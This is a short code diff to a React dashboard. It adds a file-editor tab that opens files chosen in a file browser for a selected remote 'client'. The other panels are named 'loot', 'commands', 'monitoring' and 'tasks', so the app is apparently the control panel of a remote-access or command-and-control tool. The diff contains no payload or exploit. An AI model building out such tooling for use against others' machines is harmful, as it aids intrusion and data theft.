@@ -9,10 +9,17 @@ import LootPanel from './loot-panel'
 import AnalyticsPanel from './analytics-panel'
 import TasksPanel from './tasks-panel'
 import FileBrowserPanel from './file-browser-panel'
+import FileEditorPanel from './file-editor-panel'
 
 export default function Dashboard() {
-  const [activeTab, setActiveTab] = useState<'overview' | 'clients' | 'monitoring' | 'commands' | 'loot' | 'analytics' | 'tasks' | 'files'>('overview')
+  const [activeTab, setActiveTab] = useState<'overview' | 'clients' | 'monitoring' | 'commands' | 'loot' | 'analytics' | 'tasks' | 'files' | 'editor'>('overview')
   const [selectedClient, setSelectedClient] = useState<string | null>(null)
+  const [editingPath, setEditingPath] = useState<string | null>(null)
+
+  const handleEditFile = (path: string) => {
+    setEditingPath(path)
+    setActiveTab('editor')
+  }
 
   return (
     <div className="flex h-screen bg-background overflow-hidden relative">
@@ -37,7 +44,8 @@ export default function Dashboard() {
             {activeTab === 'loot' && <LootPanel />}
             {activeTab === 'analytics' && <AnalyticsPanel />}
             {activeTab === 'tasks' && <TasksPanel />}
-            {activeTab === 'files' && <FileBrowserPanel selectedClient={selectedClient} />}
+            {activeTab === 'files' && <FileBrowserPanel selectedClient={selectedClient} onEdit={handleEditFile} />}
+            {activeTab === 'editor' && <FileEditorPanel selectedClient={selectedClient} initialPath={editingPath} />}
           </div>
         </div>
       </div>
